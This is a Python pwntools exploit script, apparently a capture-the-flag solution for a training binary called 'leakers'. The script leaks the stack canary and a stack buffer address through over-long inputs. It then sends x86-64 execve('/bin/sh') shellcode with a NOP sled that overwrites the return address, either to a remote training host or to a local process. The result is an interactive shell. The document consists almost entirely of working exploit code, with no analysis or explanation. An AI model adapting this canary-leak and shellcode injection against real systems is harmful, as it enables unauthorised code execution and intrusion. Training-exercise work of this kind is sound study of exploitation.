from pwn import *

CODE = '''
mov rbx, 0x0068732f6e69622f
push rbx
mov rdi, rsp
mov rsi, rdx
mov rdx, rdx
mov rax, 0x3b
syscall
'''

ELF('./leakers')
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 2011)
else:
    r = process('./leakers')
    gdb.attach(r, '''
        #b *0x004011bb
    ''')

shellcode_1 = asm(CODE,arch="amd64", bits='64')
nop_sled = b"\x90"
input('press a key..')

#Canary leak 
r.sendline(nop_sled*104)
r.recv()
canary = r.recv()
canary = canary[-10:]
canary =  b"\x00" + canary
canary = canary[:8]
print("Canary leaked! %s" % canary.hex())

#Buffer address leak
r.send(nop_sled*136)
stack_base = r.recv()
print(stack_base)
stack_base = stack_base[-6:]
stack_base = bytearray(stack_base)
stack_base.reverse()
stack_base = int(stack_base.hex(), 16)
where_to_jump = stack_base - 336
where_to_jump =  where_to_jump.to_bytes(8, 'little')
print("Buffer address leaked! %s" % where_to_jump.hex())


shellcode_2 =nop_sled*8+shellcode_1+nop_sled*(104-len(shellcode_1)-8)+canary+nop_sled*8+where_to_jump
r.send(shellcode_2)
r.recv()
r.sendline()
r.interactive()


